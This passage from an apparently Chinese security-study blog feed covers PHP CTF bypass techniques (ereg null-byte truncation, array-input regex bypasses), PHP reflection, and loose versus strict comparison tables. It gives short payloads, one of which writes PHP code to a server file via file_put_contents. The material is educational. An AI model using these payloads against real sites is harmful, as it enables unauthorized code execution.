        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[1-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>
            <span class="token keyword">echo</span> <span class="token string">'必须输入数字才行'</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'#biubiubiu'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>   
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token keyword">echo</span> <span class="token string">'骚年，继续努力吧啊~'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p><strong>ereg函数的漏洞</strong> ：</p>
<ul>
<li>存在%00截断（已被preg_match替代）</li>
<li>输入参数为数组时返回值为null</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/6952387-98a1a60f7e3dc083.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/613" alt="img"></p>
<p>payload：</p>
<ul>
<li>?nctf=111%00%23biubiubiu</li>
<li>?nctf[]=aa</li>
</ul>
<h3 id="4、PHP的弱类型-数组绕过正则"><a href="#4、PHP的弱类型-数组绕过正则" class="headerlink" title="4、PHP的弱类型+数组绕过正则"></a>4、PHP的弱类型+数组绕过正则</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$title</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'|\A[ _a-zA-Z0-9]+\z|is'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">write_cache</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">changedir</span><span class="token punctuation">(</span><span class="token constant">CACHE_DIR</span> <span class="token punctuation">.</span> <span class="token function">get_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"title or content error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"{$dir}{$title}.php"</span><span class="token punctuation">;</span>

    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>preg_match()返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索<code>subject</code> 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
</blockquote>
<p>preg_match本身并没有什么问题，但是在正则匹配之前，<code>$title</code>和<code>$content</code>进行了字符串连接。得益于PHP的弱类型特性，数组会被强制转换成字符串，也就是<code>Array</code>，Array肯定是满足正则<code>\A[ _a-zA-Z0-9]+\z</code>的，所以不会被拦截。</p>
<p>file_put_contents函数可以处理数组，所以构造payload:<code>?title=s&amp;content[]=&lt;?php phpinfo();?&gt;</code></p>
<h4 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h4><p><a href="https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo">https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 反射学习</title>
    <url>/2021/05/15/phpsec/php-fan-she-xue-xi/php-fan-she-xue-xi/</url>
    <content><![CDATA[<h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a>反射是什么？</h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p>
<p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p>
<p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。<br> 反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p>
<p>平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类</p>
<pre><code>&lt;?php
class Person {


 /**
  * For the sake of demonstration, we"re setting this private
  */
 private $_allowDynamicAttributes = false;

 /**
  * type=primary_autoincrement
  */
 protected $id = 0;

 /**
  * type=varchar length=255 null
  */
 protected $name;

 /**
  * type=text null
  */
 protected $biography;
 public function getId() {
  return $this-&gt;id;
 }
 public function setId($v) {
  $this-&gt;id = $v;
 }
 public function getName() {
  return $this-&gt;name;
 }
 public function setName($v) {
  $this-&gt;name = $v;
 }
 public function getBiography() {
  return $this-&gt;biography;
 }
 public function setBiography($v) {
  $this-&gt;biography = $v;
 }
}</code></pre>
<p>一、通过ReflectionClass，我们可以得到Person类的以下信息：</p>
<p>1.常量 Contants<br> 2.属性 Property Names<br> 3.方法 Method Names静态<br> 4.属性 Static Properties<br> 5.命名空间 Namespace<br> 6.Person类是否为final或者abstract<br> 7.Person类是否有某个方法</p>
<p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p>
<p>代码如下:</p>
<pre><code>$class = new ReflectionClass('Person'); // 建立 Person这个类的反射类  
$instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化Person 类 </code></pre>
<p>1）获取属性(Properties)：</p>
<p>代码如下:</p>
<pre><code>$properties = $class-&gt;getProperties();
foreach ($properties as $property) {
 echo $property-&gt;getName() . "\n";
}
// 输出:
// _allowDynamicAttributes
// id
// name
// biography</code></pre>
<p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p>
<p>代码如下:</p>
<pre><code>$private_properties = $class-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</code></pre>
<p>可用参数列表：</p>
<p>代码如下:</p>
<pre><code>ReflectionProperty::IS_STATIC
ReflectionProperty::IS_PUBLIC
ReflectionProperty::IS_PROTECTED
ReflectionProperty::IS_PRIVATE</code></pre>
<p>通过$property-&gt;getName()可以得到属性名。</p>
<p>2）获取注释：</p>
<p>通过getDocComment可以得到写给property的注释。</p>
<p>代码如下:</p>
<pre><code>foreach ($properties as $property) {
 if ($property-&gt;isProtected()) {
  $docblock = $property-&gt;getDocComment();
  preg_match('/ type\=([a-z_]*) /', $property-&gt;getDocComment(), $matches);
  echo $matches[1] . "\n";
 }
}
// Output:
// primary_autoincrement
// varchar
// text</code></pre>
<p>3）获取类的方法</p>
<p>代码如下:</p>
<pre><code>getMethods()       来获取到类的所有methods。
hasMethod(string)  是否存在某个方法
getMethod(string)  获取方法</code></pre>
<p>4）执行类的方法：</p>
<p>代码如下:</p>
<pre><code>$instance-&gt;getName(); // 执行Person 里的方法getName
// 或者：
$method = $class-&gt;getmethod('getName'); // 获取Person 类中的getName方法
$method-&gt;invoke($instance);    // 执行getName 方法
// 或者：
$method = $class-&gt;getmethod('setName'); // 获取Person 类中的setName方法
$method-&gt;invokeArgs($instance, array('snsgou.com'));</code></pre>
<p>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</p>
<p>1.是否“public”、“protected”、“private” 、“static”类型<br> 2.方法的参数列表<br> 3.方法的参数个数<br> 4.反调用类的方法</p>
<p>代码如下:</p>
<pre><code>// 执行detail方法
$method = new ReflectionMethod('Person', 'test');


if ($method-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic()) {
 echo 'Action is right';
}
echo $method-&gt;getNumberOfParameters(); // 参数个数
echo $method-&gt;getParameters(); // 参数对象数组</code></pre>
<p><a href="https://blog.csdn.net/u013416034/article/details/105933637/">https://blog.csdn.net/u013416034/article/details/105933637/</a></p>
<p><a href="https://blog.csdn.net/luyaran/article/details/84339363">https://blog.csdn.net/luyaran/article/details/84339363</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP弱类型学习</title>
    <url>/2021/06/14/phpsec/php-ruo-lei-xing-xue-xi/php-ruo-lei-xing-xue-xi/</url>
    <content><![CDATA[<h1 id="0x01：“-”和“-”"><a href="#0x01：“-”和“-”" class="headerlink" title="0x01：“==”和“===”"></a><strong>0x01：“==”和“===”</strong></h1><p>php中有两种比较的符号 == 与 ===</p>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p><strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"1admin"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e4456789"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true </span>
<span class="token delimiter">?></span>  <span class="token comment" spellcheck="true">//上述代码可自行测试</span></code></pre>
<p> <strong>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"10.5"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $test=11.5(float)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"-1.3e3"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$test=-1299(float)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"bob-1.3e3"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=1(int)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"2admin"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=3(int)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"admin2"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=1(int)</span>
<span class="token delimiter">?></span></code></pre>
<h3 id="使用-PHP-函数对变量-x-进行比较"><a href="#使用-PHP-函数对变量-x-进行比较" class="headerlink" title="使用 PHP 函数对变量 $x 进行比较"></a><strong>使用 PHP 函数对变量 $x 进行比较</strong></h3><table>
<thead>
<tr>
<th>表达式</th>
<th><a href="https://www.php.net/manual/zh/function.gettype.php">gettype()</a></th>
<th><a href="https://www.php.net/manual/zh/function.empty.php">empty()</a></th>
<th><a href="https://www.php.net/manual/zh/function.is-null.php">is_null()</a></th>
<th><a href="https://www.php.net/manual/zh/function.isset.php">isset()</a></th>
<th>boolean : <code>if($x)</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>$x = "";</code></td>
<td>string</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = null;</code></td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>var $x;</code></td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td>$x is undefined</td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = array();</code></td>
<td>array</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = array('a', 'b');</code></td>
<td>array</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = false;</code></td>
<td>boolean</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = true;</code></td>
<td>boolean</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 1;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 42;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 0;</code></td>
<td>integer</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = -1;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "1";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "0";</code></td>
<td>string</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = "-1";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "php";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "true";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "false";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h3 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较 =="></a><strong>松散比较 <code>==</code></strong></h3><table>
<thead>
<tr>
<th></th>
<th><strong><code>true</code></strong></th>
<th><strong><code>false</code></strong></th>
<th><code>1</code></th>
<th><code>0</code></th>
<th><code>-1</code></th>
<th><code>"1"</code></th>
<th><code>"0"</code></th>
<th><code>"-1"</code></th>
<th><strong><code>null</code></strong></th>
<th><code>array()</code></th>
<th><code>"php"</code></th>
<th><code>""</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>1</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>0</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>-1</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"1"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"0"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"-1"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>null</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>array()</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"php"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>""</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 ==="></a><strong>严格比较 <code>===</code></strong></h3><table>
<thead>
<tr>
<th></th>
<th><strong><code>true</code></strong></th>
<th><strong><code>false</code></strong></th>
<th><code>1</code></th>
<th><code>0</code></th>
<th><code>-1</code></th>
<th><code>"1"</code></th>
<th><code>"0"</code></th>
<th><code>"-1"</code></th>
<th><strong><code>null</code></strong></th>
<th><code>array()</code></th>
<th><code>"php"</code></th>
<th><code>""</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>1</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>0</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>-1</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"1"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"0"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"-1"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>null</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>array()</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
